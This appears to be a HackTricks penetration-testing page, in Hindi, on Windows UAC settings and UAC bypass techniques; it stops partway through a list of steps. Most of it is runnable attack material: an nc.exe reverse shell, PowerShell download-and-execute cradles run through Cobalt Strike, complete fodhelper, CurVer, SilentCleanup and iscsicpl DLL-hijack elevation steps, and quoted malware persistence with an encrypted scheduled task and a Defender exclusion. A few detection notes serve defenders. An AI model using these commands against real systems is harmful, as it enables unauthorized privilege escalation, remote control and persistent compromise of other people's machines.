# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी सुविधा है जो **elevated activities के लिए consent prompt** सक्षम करती है। Applications के अलग-अलग `integrity` levels होते हैं, और **high level** वाला program ऐसे कार्य कर सकता है जो **संभावित रूप से system को compromise कर सकते हैं**। जब UAC सक्षम होता है, तो applications और tasks हमेशा **non-administrator account के security context के अंतर्गत run होते हैं**, जब तक कि कोई administrator इन applications/tasks को system पर administrator-level access के साथ run करने के लिए स्पष्ट रूप से authorize न करे। यह एक convenience feature है, जो administrators को अनजाने में किए गए बदलावों से बचाता है, लेकिन इसे security boundary नहीं माना जाता।<sup>[[2]](#references)</sup>

integrity levels के बारे में अधिक जानकारी:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो administrator user को 2 tokens दिए जाते हैं: regular actions को medium integrity पर करने के लिए एक standard user token, और admin privileges वाला एक token।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके पर बहुत विस्तार से चर्चा करता है और इसमें logon process, user experience और UAC architecture शामिल हैं।<sup>[[2]](#references)</sup> Administrators security policies का उपयोग करके यह configure कर सकते हैं कि उनके organization के लिए local level पर UAC कैसे काम करे (secpol.msc का उपयोग करके), या Active Directory domain environment में Group Policy Objects (GPO) के माध्यम से इसे configure और push out किया जा सकता है। विभिन्न settings पर विस्तार से [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) चर्चा की गई है। UAC के लिए 10 Group Policy settings set की जा सकती हैं। निम्न table अतिरिक्त विवरण प्रदान करती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: built-in Administrator account के लिए Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode में administrators के लिए elevation prompt का Behavior](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop पर non-Windows binaries के लिए consent prompt) |
| [User Account Control: standard users के लिए elevation prompt का Behavior](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop पर credentials के लिए prompt)         |
| [User Account Control: application installations का पता लगाना और elevation के लिए prompt करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; Enterprise पर default रूप से disabled)           |
| [User Account Control: केवल signed और validated executables को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: केवल secure locations में installed UIAccess applications को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: सभी administrators को Admin Approval Mode में run करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: secure desktop का उपयोग किए बिना UIAccess applications को elevation के लिए prompt करने की अनुमति देना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: elevation के लिए prompt करते समय secure desktop पर switch करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: file और registry write failures को per-user locations पर virtualize करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows पर software install करने के लिए Policies

**local security policies** (अधिकांश systems पर "secpol.msc") default रूप से **non-admin users को software installations करने से रोकने** के लिए configured होती हैं। इसका अर्थ है कि भले ही कोई non-admin user आपके software का installer download कर सके, फिर भी वह admin account के बिना उसे run नहीं कर सकेगा।

### UAC को Elevation के लिए Prompt करने हेतु Registry Keys

एक standard user के रूप में, जिसके पास admin rights नहीं हैं, आप यह सुनिश्चित कर सकते हैं कि जब "standard" account कुछ actions करने का प्रयास करे, तो **UAC credentials के लिए prompt करे**। इसके लिए कुछ **registry keys** को modify करना आवश्यक होगा, जिनके लिए आपको admin permissions चाहिए, जब तक कि कोई **UAC bypass** मौजूद न हो या attacker पहले से admin के रूप में logged in न हो।

भले ही user **Administrators** group में हो, ये बदलाव administrative actions करने के लिए user को **अपने account credentials दोबारा enter करने के लिए बाध्य करते हैं**।

**व्यवहार में यह तभी उपयोगी है जब आपके पास पहले से elevated token, UAC bypass या ऐसी misconfiguration हो जो आपको इन keys को बदलने देती हो; अन्यथा registry write स्वयं blocked होती है।**

जिन registry keys और entries को आपको बदलना होगा, वे निम्नलिखित हैं (कोष्ठक में उनकी default values के साथ):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

यह कार्य Local Security Policy tool के माध्यम से manually भी किया जा सकता है। बदलाव करने के बाद, administrative operations user को अपने credentials दोबारा enter करने के लिए prompt करती हैं।

### Note

**User Account Control कोई security boundary नहीं है।** इसलिए standard users local privilege escalation exploit के बिना अपने accounts से बाहर निकलकर administrator rights प्राप्त नहीं कर सकते।

### किसी user से 'full computer access' माँगना
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC विशेषाधिकार

- Internet Explorer Protected Mode उच्च-अखंडता-स्तर वाली processes (जैसे web browsers) को निम्न-अखंडता-स्तर वाले data (जैसे temporary Internet files folder) तक पहुँचने से रोकने के लिए integrity checks का उपयोग करता है। यह browser को low-integrity token के साथ चलाकर किया जाता है। जब browser low-integrity zone में stored data तक पहुँचने का प्रयास करता है, तो operating system process के integrity level की जाँच करता है और उसी के अनुसार access की अनुमति देता है। यह feature remote code execution attacks को system पर sensitive data तक पहुँच प्राप्त करने से रोकने में सहायता करता है।
- जब कोई user Windows में log on करता है, तो system एक access token बनाता है जिसमें user के privileges की सूची होती है। Privileges को user के rights और capabilities के संयोजन के रूप में परिभाषित किया जाता है। Token में user के credentials की सूची भी होती है, जिनका उपयोग computer और network पर resources के लिए user को authenticate करने हेतु किया जाता है।

### Autoadminlogon

Windows को startup पर किसी specific user को automatically log on करने के लिए configure करने हेतु **`AutoAdminLogon` registry key** सेट करें। यह kiosk environments या testing purposes के लिए उपयोगी है। इसका उपयोग केवल secure systems पर करें, क्योंकि इससे password registry में exposed हो जाता है।

Registry Editor या `reg add` का उपयोग करके निम्नलिखित keys सेट करें:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal logon behavior पर वापस जाने के लिए `AutoAdminLogon` को 0 पर सेट करें।

## UAC bypass

> [!TIP]
> ध्यान दें कि यदि आपके पास victim का graphical access है, तो UAC bypass सीधा है, क्योंकि UAC prompt दिखाई देने पर आप simply "Yes" पर click कर सकते हैं।

UAC bypass निम्नलिखित situation में आवश्यक है: **UAC activated है, आपका process medium integrity context में चल रहा है, और आपका user administrators group से संबंधित है।**

यह उल्लेख करना महत्वपूर्ण है कि **यदि UAC highest security level (Always) पर है, तो उसे bypass करना अन्य levels (Default) की तुलना में बहुत कठिन होता है।**

### Medium-integrity shell से Fast triage

किसी bypass का प्रयास करने से पहले, पुष्टि करें कि आप सही scenario में हैं और host build को ज्ञात working methods से map करें:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
व्यावहारिक नोट्स:
- यदि `EnableLUA=0` है, तो आपको bypass की आवश्यकता नहीं है: कोई भी admin token सीधे high integrity का अनुरोध कर सकता है।
- `ConsentPromptBehaviorAdmin=2` या `5` auto-elevate / COM-based bypasses के लिए सामान्य scenario है।
- `Always Notify` bar को बढ़ाता है, लेकिन आपको failure मान लेने के बजाय exact build का परीक्षण करना चाहिए: आधुनिक Windows builds पर UACME अभी भी कुछ `AlwaysNotify compatible` methods को track करता है।<sup>[[3]](#references)</sup>

### UAC disabled

यदि UAC पहले से disabled (`ConsentPromptBehaviorAdmin` **`0`** है), तो आप इस तरह कुछ उपयोग करके **admin privileges के साथ reverse shell execute** कर सकते हैं (high integrity level):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत** Basic UAC "bypass" (पूर्ण file system access)

यदि आपके पास ऐसे user का shell है जो Administrators group में है, तो आप SMB (file system) के माध्यम से साझा किए गए **C$** को स्थानीय रूप से एक नई disk में **mount** कर सकते हैं और आपको **file system के अंदर मौजूद हर चीज़ तक access** मिल जाएगा (यहाँ तक कि Administrator home folder तक भी)।

> [!WARNING]
> **ऐसा लगता है कि यह trick अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike techniques केवल तभी काम करेंगी जब UAC को उसके max security level पर सेट न किया गया हो.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में **UAC** को **bypass** करने के लिए कई modules भी हैं।

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects आधुनिक builds पर एक practical UAC surface बने हुए हैं। `ICMLuaUtil` को UACME अभी भी current Windows branches पर working के रूप में track करता है, और offensive tooling `CMSTPLUA` को interactive desktop process, 64-bit execution और कभी-कभी PEB/process masquerading के संयोजन के साथ adapt करना जारी रखता है, फिर COM Elevation Moniker को invoke करता है।<sup>[[3]](#references)</sup>

Practical tips:
- User के **interactive session** में **64-bit** process को प्राथमिकता दें (आमतौर पर `explorer.exe` या उसका child)।
- यदि raw shell fail हो जाए, तो naive `CreateProcess` wrapper के बजाय BOF / UACME implementation से retry करें।
- Child execution के **separate elevated process** में होने की अपेक्षा रखें; कई BOFs current beacon को in-place elevate नहीं करते।

### KRBUACBypass

Documentation और tool: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) UAC bypass techniques का collection है। इसे Visual Studio या MSBuild के साथ compile करें; build कई executables बनाता है (उदाहरण के लिए, `Source\Akagi\output\x64\Debug\Akagi.exe`), इसलिए target build के लिए उपयुक्त method चुनें।<sup>[[3]](#references)</sup>\
सावधान रहें: कुछ bypasses visible programs या prompts launch करते हैं, जो user को alert कर सकते हैं।<sup>[[3]](#references)</sup>

UACME में **build version** दिया गया है, जिससे प्रत्येक technique ने काम करना शुरू किया।<sup>[[3]](#references)</sup> आप अपने versions को प्रभावित करने वाली technique खोज सकते हैं:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
साथ ही, [इस](https://en.wikipedia.org/wiki/Windows_10_version_history) पेज का उपयोग करके आप build versions से Windows release `1607` प्राप्त कर सकते हैं।

एक व्यावहारिक workflow यह है कि पहले **host build को score करें**, और उसके बाद ही matching method चलाएँ:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` स्थानीय build की तुलना अपने ज्ञात UAC methods से तेज़ी से करता है, जो बेकार PoCs को जल्दी हटाने में उपयोगी है।<sup>[[4]](#references)</sup>
- `UACME` किसी bypass को सटीक build से map करने के लिए अब भी सबसे अच्छा public catalogue है। Version 3.7.1 ने methods 83–85 जोड़े, जबकि पिछली release ने मौजूदा methods को **Windows 11 25H2** के विरुद्ध फिर से test किया था; किसी पुराने PoC के बिना बदलाव के अब भी लागू होने की धारणा बनाने के बजाय method table और release notes को दोबारा जाँचें।<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-सक्षम WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` हर UAC bypass को समाप्त नहीं करता। UACME 3.7.1 तीन नए x64 methods लागू करता है, जो user-controlled environment/protocol state को elevated scheduled-task या UIAccess behavior के साथ जोड़ते हैं, और इन सभी को `AlwaysNotify compatible` के रूप में चिह्नित करता है:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` को redirect करें, ताकि WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, elevated `taskhostw.exe` से `unifiedconsent.dll` को side-load करवाए। UACME इसे Windows 10 build 19041 से track करता है।
- **84 — TabTip:** UIAccess `TabTip.exe` के विरुद्ध उसी environment-variable primitive का उपयोग करें, जो build के आधार पर `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, या `rsaenh.dll` load करता है; फिर resulting high-integrity UIAccess context से pivot करें। UACME इसे Windows 8.1 / Server 2016 से track करता है।
- **85 — Narrator:** per-user `feedback-hub` protocol को hijack करें, `Alt+CapsLock+F` से Narrator को चलाएँ, फिर `osk.exe` की writable copy launch करें, जो `OskSupport.dll` को side-load करती है। इसके लिए interactive desktop आवश्यक है और इसे Windows 10 1809 / Server 2019 से track किया जाता है।

UACME में documented तरीके के अनुसार payload units और Akagi build करने के बाद matching method number invoke करें (optional command का default `cmd.exe` है):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 और 85 UIAccess/desktop interaction पर निर्भर करते हैं, इसलिए Session 0 या non-interactive service shell से इनके बिना बदलाव के काम करने की अपेक्षा न करें। तीनों environment/protocol state में बदलाव करते हैं और DLLs को stage करते हैं; implementation की जाँच करें और testing के बाद उन artifacts को हटा दें।<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Trusted binary `fodhelper.exe` modern Windows पर auto-elevated होता है। लॉन्च होने पर, यह नीचे दिए गए per-user registry path को `DelegateExecute` verb को validate किए बिना query करता है। वहाँ कोई command रखने से Medium Integrity process (user Administrators group में है) बिना UAC prompt के High Integrity process spawn कर सकता है।

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell चरण (अपना payload सेट करें, फिर trigger करें)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- यह तब काम करता है जब current user Administrators का member हो और UAC level default/lenient हो (Always Notify with extra restrictions नहीं)।
- 64-bit Windows पर 32-bit process से 64-bit PowerShell शुरू करने के लिए `sysnative` path का उपयोग करें।
- Payload कोई भी command (PowerShell, cmd, या EXE path) हो सकता है। Stealth के लिए prompting UIs से बचें।

#### CurVer/extension hijack variant (HKCU only)

Recent samples `fodhelper.exe` का abuse करते समय `DelegateExecute` से बचते हैं और इसके बजाय per-user `CurVer` value के माध्यम से **`ms-settings` ProgID को redirect** करते हैं। Auto-elevated binary अभी भी handler को `HKCU` के अंतर्गत resolve करता है, इसलिए keys plant करने के लिए admin token की आवश्यकता नहीं होती:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Elevated होने के बाद, malware आमतौर पर `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` को `0` पर सेट करके **भविष्य के prompts को disable** कर देता है, फिर अतिरिक्त defense evasion करता है (जैसे, `Add-MpPreference -ExclusionPath C:\ProgramData`) और high integrity के रूप में चलने के लिए persistence को फिर से बनाता है। एक सामान्य persistence task डिस्क पर एक **XOR-encrypted PowerShell script** संग्रहीत करता है और उसे हर घंटे memory में decode/execute करता है:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
यह variant अभी भी dropper को साफ कर देता है और केवल staged payloads छोड़ता है, जिससे detection **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation या ऐसे scheduled tasks की monitoring पर निर्भर रहती है, जो PowerShell को in-memory decrypt करते हैं।<sup>[[5]](#references)</sup>

### `SilentCleanup` task के माध्यम से UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup` `cleanmgr.exe` को highest privileges के साथ launch करता है और user environment से `%windir%` को expand करता है। यदि आपका नियंत्रण `HKCU\Environment\windir` पर है, तो आप उस expansion को arbitrary command पर redirect कर सकते हैं और consent dialog के बिना high integrity प्राप्त कर सकते हैं।<sup>[[8]](#references)</sup> Recent builds पर इस method का testing अभी भी उपयोगी है, क्योंकि UACME इस technique को active रखता है और recent issue tracking से पता चलता है कि Windows 11 24H2 में केवल छोटे quoting adjustments की आवश्यकता हो सकती है।<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
यदि उस build पर task path को quote करता है, तो payload के अंत में quote लगाकर retry करें (उदाहरण के लिए `cmd.exe"`). Testing के बाद हमेशा `HKCU\Environment\windir` को साफ़ करें।

#### अधिक UAC bypass

UI flows, COM objects या desktop interaction का दुरुपयोग करने वाले कई classic UAC bypass के लिए victim के साथ एक **full interactive session** आवश्यक होता है; एक सामान्य `nc.exe` shell या **Session 0** में चलने वाली service अक्सर पर्याप्त नहीं होती।

आप अक्सर इसे **meterpreter** session का उपयोग करके हल कर सकते हैं। ऐसे **process** पर migrate करें जिसका **Session** value **1** के बराबर हो:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ को काम करना चाहिए)

### GUI के साथ UAC Bypass

यदि आपके पास **GUI** का access है, तो UAC prompt दिखाई देने पर आप उसे स्वीकार कर सकते हैं; वास्तव में आपको किसी technical bypass की आवश्यकता नहीं होती। इसलिए, GUI session प्राप्त करना अक्सर UAC द्वारा जोड़ी गई practical बाधा को पार करने के लिए पर्याप्त होता है।

इसके अलावा, यदि आपको ऐसा GUI session मिलता है जिसका उपयोग कोई व्यक्ति कर रहा था (संभवतः RDP के माध्यम से), तो **कुछ tools administrator के रूप में चल रहे होंगे**, जहाँ से आप उदाहरण के लिए सीधे **as admin** एक **cmd** **run** कर सकते हैं और UAC द्वारा दोबारा prompt नहीं किया जाएगा, जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह कुछ अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि noise स्वीकार्य है, तो [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा tool बार-बार elevation का अनुरोध कर सकता है, जब तक कि user उसे स्वीकार न कर ले।

### अपना bypass - Basic UAC bypass methodology

यदि आप **UACME** पर नज़र डालें, तो पाएँगे कि **कई UAC bypass DLL hijacking का दुरुपयोग करते हैं** (अक्सर किसी elevated binary से writable path में मौजूद attacker-controlled DLL load करवाकर)। [DLL hijacking vulnerability ढूँढने का तरीका जानने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking/index.html)।

1. ऐसा binary ढूँढें जो **autoelevate** होता हो (जाँचें कि execute किए जाने पर वह high integrity level में चलता है)।
2. Procmon के साथ "**NAME NOT FOUND**" events ढूँढें, जो **DLL Hijacking** के लिए vulnerable हो सकते हैं।
3. संभवतः आपको DLL को कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर **write** करना होगा, जहाँ आपके पास writing permissions नहीं हैं। आप इसे निम्नलिखित का उपयोग करके bypass कर सकते हैं:
1. **wusa.exe**: Windows 7,8 और 8.1। यह protected paths के अंदर CAB file की सामग्री extract करने की अनुमति देता है (क्योंकि यह tool high integrity level से execute होता है)।
2. **IFileOperation**: Windows 10।
4. एक **script** तैयार करें जो आपकी DLL को protected path के अंदर copy करे और vulnerable तथा autoelevated binary को execute करे।

### एक अन्य UAC bypass technique

इसमें यह देखना शामिल है कि क्या कोई **autoElevated binary** **registry** से execute किए जाने वाले किसी **binary** या **command** का **name/path** **read** करने का प्रयास करता है (यह अधिक interesting है यदि binary इस information को **HKCU** के अंदर खोजता है)।

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack के माध्यम से UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` एक **auto-elevated** binary है, जिसका search order के माध्यम से `iscsiexe.dll` load करने के लिए दुरुपयोग किया जा सकता है। यदि आप किसी **user-writable** folder के अंदर malicious `iscsiexe.dll` रख सकते हैं और फिर current user `PATH` को modify कर सकते हैं (उदाहरण के लिए `HKCU\Environment\Path` के माध्यम से), ताकि उस folder को search किया जाए, तो Windows attacker DLL को elevated `iscsicpl.exe` process के अंदर **बिना UAC prompt दिखाए** load कर सकता है।<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- यह तब उपयोगी है जब current user **Administrators** में हो, लेकिन UAC के कारण **Medium Integrity** पर चल रहा हो।
- इस bypass के लिए **SysWOW64** वाली copy relevant है। **System32** वाली copy को एक अलग binary मानें और behavior को independently validate करें।
- यह primitive **auto-elevation** और **DLL search-order hijacking** का combination है, इसलिए अन्य UAC bypass के लिए उपयोग किया जाने वाला ProcMon workflow missing DLL load को validate करने में उपयोगी है।

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `reg add` / registry writes to `HKCU\Environment\Path` के बाद तुरंत `C:\Windows\SysWOW64\iscsicpl.exe` के execution पर alert करें।
- `%TEMP%` या `%LOCALAPPDATA%\Microsoft\WindowsApps` जैसे **user-controlled** locations में `iscsiexe.dll` की तलाश करें।
- `iscsicpl.exe` launches को सामान्य Windows directories के बाहर से होने वाली unexpected child processes या DLL loads के साथ correlate करें।

### अलग से जांचने योग्य नया research

कुछ post-2024 chains अब classic `HKCU\Software\Classes` registry hijacks जैसी नहीं दिखतीं। उदाहरण के लिए, activation-context cache poisoning, **drive remap** और **DLL redirection** को chain करके trusted UI / auto-elevated binaries जैसे `ctfmon.exe` और बाद में `fodhelper.exe` जैसे targets के माध्यम से medium से high integrity तक पहुंच बनाई जा सकती है। यहां बड़ा PoC दोहराने के बजाय, इन compact payload examples को देखें:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) per-logon-session DOS device map के माध्यम से drive-letter hijack

> [!NOTE]
> अगस्त 2026 तक, Microsoft अभी भी Administrator Protection को **Insider preview** के रूप में document करता है: अक्टूबर 2025 का rollout वापस ले लिया गया था और इसे बाद की तारीख के लिए planned किया गया है। इन chains की testing से पहले पुष्टि करें कि **Admin Approval Mode with Administrator protection** वास्तव में enabled है और device को reboot किया गया है; केवल stock 25H2 version string यह साबित नहीं करती कि feature active है।<sup>[[10]](#references)</sup>

Windows 11 25H2 preview builds पर पूरे `RAiLaunchAdminProcess` / UIAccess attack surface के लिए dedicated page देखें:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 का “Administrator Protection” per-session `\Sessions\0\DosDevices/<LUID>` maps के साथ shadow-admin tokens का उपयोग करता है। Directory को `SeGetTokenDeviceMap` द्वारा पहले `\??` resolution पर lazily बनाया जाता है। यदि attacker shadow-admin token को केवल **SecurityIdentification** पर impersonate करता है, तो directory attacker को **owner** के रूप में रखकर बनाई जाती है (`CREATOR OWNER` inherit करती है), जिससे ऐसे drive-letter links बनाए जा सकते हैं जो `\GLOBAL??` पर precedence लेते हैं।<sup>[[7]](#references)</sup>

**चरण:**

1. Low-privileged session से promptless shadow-admin `runonce.exe` spawn करने के लिए `RAiProcessRunOnce` call करें।
2. उसके primary token को एक **identification** token में duplicate करें और `\??` खोलते समय उसका impersonation करें, ताकि `\Sessions\0\DosDevices/<LUID>` attacker ownership के अंतर्गत बनाया जा सके।
